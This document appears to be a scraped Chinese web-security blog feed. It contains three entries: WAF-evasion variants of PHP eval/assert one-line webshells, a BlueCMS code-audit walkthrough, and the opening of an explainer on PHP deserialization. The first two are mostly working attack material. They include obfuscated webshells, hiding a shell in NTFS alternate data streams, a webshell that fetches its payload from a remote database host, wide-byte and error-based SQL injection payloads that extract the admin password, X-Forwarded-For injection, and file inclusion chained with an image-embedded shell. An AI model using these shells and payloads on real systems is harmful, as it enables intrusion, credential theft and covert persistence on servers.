<h2 id="end-函数绕过waf"><a href="#end-函数绕过waf" class="headerlink" title="end()函数绕过waf"></a>end()函数绕过waf</h2><p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417094040398-1396797817.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417094158639-355224543.png" alt=""><br><strong>我们可以想想如何绕过waf的拦截，不使用[]来进行传参执行呢，我们发现end()函数能够输出数组中的当前元素和最后一个元素的值</strong><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417094358893-1086798163.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417094455153-1742373616.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417094708000-230214879.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417094717956-544626602.png" alt=""></p>
<h2 id="通过常量定义绕过waf"><a href="#通过常量定义绕过waf" class="headerlink" title="通过常量定义绕过waf"></a>通过常量定义绕过waf</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?php define(&quot;a&quot;,&quot;$_REQUEST[a]&quot;);eval(a)?&gt;;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417095449246-195649711.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417095518746-231682179.png" alt=""></p>
<h2 id="通过字符串拼接-双美元符号"><a href="#通过字符串拼接-双美元符号" class="headerlink" title="通过字符串拼接+双美元符号"></a>通过字符串拼接+双美元符号</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $a=<span class="string">'ass'</span>;</span><br><span class="line">	$b=<span class="string">'ert'</span>;</span><br><span class="line"> 	$funcName=$a.$b; <span class="comment">//assert</span></span><br><span class="line">	$x=<span class="string">'funcName'</span>;</span><br><span class="line">	$$x($_REQUEST[<span class="number">1</span>]); <span class="comment">//$funcName =&gt; assert[$_REQUEST[1]]</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417100634742-82362787.png" alt=""></p>
<h2 id="通过定义函数强行分割"><a href="#通过定义函数强行分割" class="headerlink" title="通过定义函数强行分割"></a>通过定义函数强行分割</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($a)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> $a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(a($_REQUEST)[a]); <span class="comment">//强行分割$_POST['a']</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417101334645-1028388129.png" alt=""></p>
<h2 id="通过类定义，然后传参强行分割"><a href="#通过类定义，然后传参强行分割" class="headerlink" title="通过类定义，然后传参强行分割"></a>通过类定义，然后传参强行分割</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $name=<span class="string">''</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="string">"$this-&gt;name"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user= <span class="keyword">new</span> User;</span><br><span class="line">$user-&gt;name=<span class="string">''</span>.$_REQUEST[a];</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417103047413-86501604.png" alt=""></p>
<h2 id="多种方式传参免杀"><a href="#多种方式传参免杀" class="headerlink" title="多种方式传参免杀"></a>多种方式传参免杀</h2><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$COOKIE = $_COOKIE;<span class="comment">//获取Cookie传参 数组; a=1 $key=a $value=1;</span></span><br><span class="line"><span class="keyword">foreach</span>($COOKIE <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">	<span class="keyword">if</span>($key==<span class="string">'assert'</span>)&#123;</span><br><span class="line">		$key($_REQUEST[a];)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417103901765-345712183.png" alt=""></p>
<h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=get_defined_functions();<span class="comment">//返回已经定义的函数给我 二维数组</span></span><br><span class="line">$a[<span class="string">"internal"</span>][<span class="number">847</span>]($_REQUEST[<span class="string">"a"</span>]);</span><br></pre></td></tr></table></figure></div>

<p><img src="C:%5CUsers%5C23242%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210417110411852.png" alt="image-20210417110411852"></p>
<p><strong><em>以上在安全狗环境测试</em></strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]===<span class="string">'1'</span>)</span><br><span class="line">&#123;<span class="keyword">eval</span>(end(%_REQUEST));&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417111557580-2017515423.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417111624953-21953834.png" alt=""></p>
<h2 id="拿到shell之后藏shell的妙招：-ntfs文件流"><a href="#拿到shell之后藏shell的妙招：-ntfs文件流" class="headerlink" title="拿到shell之后藏shell的妙招： ntfs文件流"></a>拿到shell之后藏shell的妙招： ntfs文件流</h2><blockquote>
<p>NTFS文件流，文件上传 1.jpg:2.txt</p>
<p>cmd 中 echo  xxx &gt;&gt; 1.txt:2.txt  dir /r 可以查看数据流::$date</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">cmd中命令</span><br><span class="line">www&#x2F;echo &quot;&lt;?php eval($_REQUEST[a]);?&gt;&quot; &gt;&gt; &#x2F;:1.txt</span><br><span class="line"></span><br><span class="line">j.php中包含代码</span><br><span class="line">&lt;?php include(&#39;&#x2F;:1.txt&#39;); ?&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417125948529-1147838311.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417130024856-884945110.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417130054721-818702029.png" alt=""></p>
<h2 id="（终极手法-绕过市面上所有Waf"><a href="#（终极手法-绕过市面上所有Waf" class="headerlink" title="（终极手法)绕过市面上所有Waf"></a>（终极手法)绕过市面上所有Waf</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">assert(mysqli_fetch_assoc(mysqli_query(mysqli_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'maoshe'</span>),<span class="string">'select * from info'</span>))[<span class="string">'info'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417133241901-2067697455.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417133319502-927493245.png" alt=""></p>
<blockquote>
<p>提示：可以通过<strong>香港云</strong>各种网上的数据库进行连接然后传参getshell   用这段代码连接自己香港云的服务器可以达到getshell</p>
</blockquote>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417134454426-1421162419.png" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>以上就是关于waf的sql注入的一些绕过</p>
<p>和一句话木马的各种骚操作和终极绕过思考办法。</p>
</blockquote>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>0day审计实战案例</title>
    <url>/2021/04/12/0day%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="代码审计的思路"><a href="#代码审计的思路" class="headerlink" title="代码审计的思路"></a><strong>代码审计的思路</strong></h1><blockquote>
<p>代码审计核心在于通过源代码，知道代码如何执行，然后根据代码执行中可能产生的问题来寻找漏洞。</p>
</blockquote>
<p><em>代码审计一般泛指白盒审计，但是要记住，通用性漏洞，例如CMS通杀漏洞，其实并不是仅仅只有代码审计能好到，本地搭建然后纯黑盒测试也可以的。只不过代码审计更为全面的容易找到漏洞</em></p>
<blockquote>
<p>代码审计其实思路很简单，一共两条路线，全文通读和敏感函数定位。</p>
</blockquote>
<p><em>全文通读：我看了每一行代码不是还不够清楚吗？</em></p>
<p><em>敏感函数定位：掌握住可以存在危险函数的地方 反推</em></p>
<hr>
<p>渗透测试人员 -&gt; 渗透测试 -&gt; 找漏洞 -&gt; 找Bug -&gt; 开发人员的技术不到关|衔接问题|项目经理得罪了|任何原因</p>
<p>安全不能孤立：业务方便 &lt;-&gt; 安全 (没有绝对的安全)-&gt;纳什均衡 =&gt; 漏洞一定存在</p>
<p>代码设计的核心    </p>
<p>变量覆盖 $$</p>
<p>文件包含  include  </p>
<p>黑盒渗透测试 -&gt; 信息收集<br>如果没有功能没有传参，怎么可能拿得下</p>
<p>黑盒部分 -&gt; 寻找功能点 -&gt; SQL注入 -&gt; XSS -&gt; CSRF -&gt; XXE -&gt; SSRF -&gt; 文件上传 -&gt; 逻辑漏洞  &lt;=&gt; 验证码绕过、密码找回、支付漏洞、越权</p>
<p>白盒部分 -&gt; 变量覆盖-&gt; 文件包含 -&gt; 反序列化</p>
<p>黑盒测试没成功 -&gt; 为什么 -&gt; 过滤 &lt;=&gt; 传参错误 -&gt; 过滤规则、传参后参数经过什么处理？</p>
<p>CMS是个通用的东西，但是你的环境不一定和所有人相同，php肯定要交互数据库，你的数据库密码和库名不可能和每个人相同</p>
<p>​                                                                         <strong>——笔录</strong></p>
<hr>
<blockquote>
<p>*<em>无论是哪一个审计方法都需要一定的编程功底，但是如果你的编程功底不够怎么办？ *</em></p>
<p><em>等死吗</em></p>
<p><strong><em>也并不是</em>，其实也可以尝试使用黑盒+白盒代码审计的方式进行一个学习，通过黑盒的方式来进行测试，然后去了解究竟传参进去经过处理发生了什么？</strong></p>
<p>然后构建出合适的语句进行尝试，最后找到问题所在点。</p>
<p>思路就是这个两个，具体的会用曾经写的文章为案例进行分析。</p>
</blockquote>
<h1 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h1><p><strong>测试</strong>CMS：<strong>BlueCMS</strong></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413191108509-890495362.png" alt=""></p>
<p>一、安装板块 install  能不能多次安装 </p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413191158358-362954777.png" alt=""></p>
<blockquote>
<p><strong>1、重复安装代表着你能破坏网站</strong></p>
<p><strong>2、重复安装你能进入后台</strong></p>
<p><strong>站库分离 =&gt; 数据库 和网站不在同一个机器</strong></p>
<p><strong>3、其实重装的时候也会产生安全问题</strong></p>
<p><strong>网站访问数据库，你的数据库账号密码会储存在哪里？ 配置文件</strong></p>
</blockquote>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413191333480-2101333300.png" alt=""></p>
<p>安全防御 </p>
<p>​        内网比外网弱、后台比前台弱</p>
<p>边缘知识你们不知道 、 这个叫做骚姿势</p>
<h2 id="漏洞地方1：进入注册窗口可以通过burp用户名已存在爆破出用户"><a href="#漏洞地方1：进入注册窗口可以通过burp用户名已存在爆破出用户" class="headerlink" title="漏洞地方1：进入注册窗口可以通过burp用户名已存在爆破出用户"></a>漏洞地方1：进入注册窗口可以通过burp用户名已存在爆破出用户</h2><p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413191521574-968730619.png" alt=""></p>
<blockquote>
<p>burp抓包之后看到一个act的传参，在代码审计中查询<strong>do_reg</strong></p>
</blockquote>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413191820120-1912782624.png" alt="img"></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413192054170-1976464858.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413192907442-411855817.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413192944273-2092785418.png" alt=""></p>
<blockquote>
<p>*<em>由此可以看出后端是使用insert进行数据库插入，这里可能存在Mysql注入，也没看到XSS过滤可能存在，我们去实践一下 *</em></p>
</blockquote>
<h2 id="漏洞地方2：白盒审计注入以及XSS"><a href="#漏洞地方2：白盒审计注入以及XSS" class="headerlink" title="漏洞地方2：白盒审计注入以及XSS"></a>漏洞地方2：白盒审计注入以及XSS</h2><blockquote>
<p><em>进行mysql监控查看我们输入的数据，并且在</em></p>
<p><strong><em>1、注册页面进行单引号双引号和#号进行mysql注释测试，2、明显有前端测试，我们用burp抓包进行修改邮箱进行sql注入测试，注册成功表明我们输入的单引号和双引号闭合，和#注释并没有起到作用，</em></strong></p>
<p><strong><em>3、我们去审计里面看看是什么操作，明显发现有魔术引号，这里我们可以使用宽字节注入进行闭合操作，根据sql语句的语法，补全value的值，进行sql注入</em></strong></p>
<p><strong><em>4、明显出现了报错，这里可以尝试报错注入使用updataxml进行中的0x7e和路径拼接报错数据库，在本地环境执行、弹出数据库报错，但是网页上怎么也报不出来，问题暂时未知，可以用盲注进行SQL注入。</em></strong></p>
<p><strong><em>5、接着我们进行XSS，结果弹框了，可以用存储型XSS获得adminCookie</em></strong></p>
<p><strong><em>6、延续SQL注入，insert into这个语法可以插入多行数据，我们可以试试进行信息插入，我们继续mysql监控审计姓账号是字符串可以用0x十六进制代替,虽然报错了，但是上传打到了本地数据库并且可以确定数据语句执行了，接着我们可以直接查询管理员密码和md5解码</em></strong></p>
<p><strong><em>7、万能密码用户登录测试成功</em></strong></p>
</blockquote>
<p>汉’,1,1),(1012,0x646a646a,md5(123456),(select pwd from blue_admin limit 0,1),1,1)#</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO blue_user (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&#39;&#39;, &#39;admin123&#39;, md5(&#39;admin1&#39;), &#39;admin&#39; or updatexml(1,concat(0x7e,(select database())),1),1,1)#1123@qq.com&#39;, &#39;1618314159&#39;, &#39;1618314159&#39;)</span><br><span class="line"></span><br><span class="line">INSERT INTO blue_user (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&#39;&#39;, &#39;admin123&#39;, md5(&#39;admin1&#39;), &#39;admin汉&#39;,1,1),(100,0x646a646a646a646a,md5(123456),(select pwd from blue_admin limit 0,1),1,1)#1123@qq.com&#39;, &#39;1618314159&#39;, &#39;1618314159&#39;)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413193447997-630670765.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413193622498-247181928.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413193750496-253088850.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413193940323-105450611.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413194058527-881289863.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413194301201-651163485.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413194320070-1517598188.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413194338976-1303408385.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413194811914-1661076787.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413194859142-1952452830.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413195108384-1595259330.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413195552763-574282435.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413200046737-1874046309.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413201029999-340161797.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413201049296-1047990987.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413201059697-1800634517.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413202049353-1756711484.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413202153497-1499103690.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413202249652-820682785.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413202737132-917292193.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413202604687-162486920.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413203120429-2090608954.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413203022652-549541630.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413212248637-286660853.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413212321423-1665700511.png" alt=""></p>
<h3 id="获得管理员密码"><a href="#获得管理员密码" class="headerlink" title="获得管理员密码"></a><strong>获得管理员密码</strong></h3><p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413212634340-1892216158.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413212729108-645290268.png" alt=""></p>
<h3 id="万能密码漏洞"><a href="#万能密码漏洞" class="headerlink" title="万能密码漏洞"></a>万能密码漏洞</h3><p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210413214442316-196076608.png" alt=""></p>
<hr>
<p>SESSION 变量覆盖</p>
<p>验证码死都对不上 SESSION</p>
<p>网站存在SQL注入的时候，我们其实要注意，当这个页面存在，代表着可能很多页面都会中枪</p>
<p>后台比前台脆弱的多</p>
<p>内网比外网脆弱的多</p>
<p>宽字节核心 魔术引号 在‘ “ \前面加一个\</p>
<p>GET POST COOKIE 传参都会被魔术引号处理</p>
<hr>
<p>INSERT INTO blue_comment (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check)<br>             VALUES (‘’, ‘1’, ‘1’, ‘1’, ‘6’, ‘ewafwaf’, ‘1618386586’, ‘192.168.136.1’, ‘1’)</p>
<p>1’ and updataxml(1,concat(0x7e,(select database())),1),1)#</p>
<p>闭合问题</p>
<p>前台GETshell 带走服务器</p>
<p><strong>windows路径长度限制</strong> include 长度最大限制</p>
<p>截断方法 5.3以下</p>
<p>../../1.txt………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………<br>文件包含+图片马=组合拳<br>文件写入</p>
<h2 id="漏洞地方3：文件包含漏洞-图片马组合拳"><a href="#漏洞地方3：文件包含漏洞-图片马组合拳" class="headerlink" title="漏洞地方3：文件包含漏洞+图片马组合拳"></a>漏洞地方3：文件包含漏洞+图片马组合拳</h2><p>INSERT INTO blue_comment (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (‘’, ‘1’, ‘1’, ‘1’, ‘6’, ‘awfeeawfeaw’, ‘1618448970’, ‘192.168.136.1’, ‘1’)</p>
<p>‘or updataxml(1,concat(0x7e,(select database()),1) ,1)#</p>
<blockquote>
<p><strong>1、因为GET POST COOKIE传参都会被魔术引号处理 我们可以尝试一下是否会被魔术引号转义，Head请求头注入XXF</strong></p>
</blockquote>
<p><strong>当我们在index文件中添加die进行输出页面测试使用GET进行传参时，发现GET/REQUEST/POST都会被魔术引号转义</strong><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415085454909-133134726.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415085624294-1513364764.png" alt=""><br><strong>所以我们选择尝试用head请求头burp进行抓包传参，使用$_SERVER[‘HTTP_USER_AGENT’]来接收传参</strong><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415085839341-1778581083.png" alt=""><br><strong>burp抓包</strong><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415085917863-1178626012.png" alt=""><br><strong>发现并没有被魔术引号转义，测试出可能会有head请求头注入</strong><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415085945595-938587273.png" alt=""><br><strong>尝试在审计系统里面全局搜索SERVER，突然发现ip变量，并且同时存在调用函数getip()</strong><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415090210855-156162882.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415090314877-573517266.png" alt=""><br><strong>于是我寻找getip的关键词，发现了sql语句insert into并且有插入getip()</strong><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415090359108-1096291419.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415090443398-1666026866.png" alt=""><br><strong>存在XXF，进行尝试，发现这个ip传参是在评论系统里面，于是我们进行评论</strong><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415090736703-1377001132.png" alt=""><br><strong>进入mysql监控，查看是进行了什么sql语句，可以看出是传入是我们的X-Forwaded-For所以可以进行抓包head头报错注入</strong><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415091020904-1258397974.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415092203310-1900568211.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415092216192-1069860826.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415092350097-243432850.png" alt=""><br><strong>我们可以采用sqlmap进行盲注，因为会报错，在需要跑sql语句的地方打*用level3级</strong><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415092602646-691535268.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415092748620-872935321.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415092758695-609214844.png" alt=""><br><strong>接着就完成盲注了。</strong><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415092825887-687974525.png" alt=""></p>
<h3 id="本地文件包含漏洞前台getshell图文操作"><a href="#本地文件包含漏洞前台getshell图文操作" class="headerlink" title="本地文件包含漏洞前台getshell图文操作"></a><strong>本地文件包含漏洞前台getshell图文操作</strong></h3><p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415093152379-1632948426.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415093231528-40548564.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415093318754-644138554.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415093557496-1269831051.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415093621247-1750062782.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415094011165-398025669.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415094039386-1873093300.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415094101518-1555621586.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415094234432-1220749427.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415094307610-1211444011.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415094313864-1330033206.png" alt=""><br><strong>因为这个inlcude包含的路径是固定的include/payment/‘.$_POST[‘pay’].”/index.php，在php5.3以下的版本可以进进行windows路径长度限制256进行截断最后的index.php，所以我们尝试截断</strong><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415094641292-269723023.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415094821921-895001388.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415094840695-1891852335.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415094912470-68569619.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415094954870-1587664188.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415095032377-1567499960.png" alt=""></p>
<p><strong>但是我们只是在本地上创建文件所以成功，接下来我们进行图片马</strong></p>
<h3 id="图片马和文件包含组合"><a href="#图片马和文件包含组合" class="headerlink" title="图片马和文件包含组合"></a>图片马和文件包含组合</h3><p><strong>制作一个能写入文件的图片马</strong><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415191710731-873460633.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415191804282-607493744.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415191821106-856845441.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415191913216-825245160.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415191959888-860749916.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415192024426-2089407013.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415192103575-1049275778.png" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p><strong>BlueCMS</strong>:目前操作中，能发现万能密码、mysql注入、盲注、head头注入（XXF）、XXS反射、存储、DOM、文件包含漏洞、文件上传漏洞，其他的还有很多等。</p>
</blockquote>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>unserialize反序列化漏洞</title>
    <url>/2021/04/11/unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>什么是序列化？</strong></p>
<p>序列化（serialize）是将对象的状态信息转换为可以存储或传输的形式过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。【将状态信息保存为字符串】</p>
<p><strong>简单的理解</strong>：将php中 对象、类、数组、变量、匿名函数等，转化为字符串，方便保存到数据库或文件中</p>
<p><strong>什么是反序列化？</strong></p>
<p>序列化就是将对象的状态信息转为字符串存储起来，那么反序列化就是再将这个状态信息拿出来使用。（重新再转化为对象或者其他的）【将字符串转化为状态信息】</p>
<blockquote>
<p>当在php中创建了一个对象后，可以通过serialize（）把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。</p>
</blockquote>
